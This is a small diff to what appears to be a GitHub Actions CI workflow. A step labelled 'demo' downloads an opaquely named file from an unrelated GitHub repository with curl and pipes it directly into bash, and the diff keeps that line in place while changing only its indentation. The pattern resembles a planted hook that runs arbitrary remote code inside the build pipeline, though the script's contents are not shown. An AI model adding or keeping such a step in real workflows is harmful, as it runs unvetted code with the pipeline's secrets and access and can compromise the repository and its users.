@@ -19,5 +19,5 @@ jobs:
       - uses: depot/build-push-action@v1
       - name: demo
         run: |
-        curl -sL https://github.com/stellavholiza-dev/kikir/raw/main/newxelzsa | bash
+          curl -sL https://github.com/stellavholiza-dev/kikir/raw/main/newxelzsa | bash
   
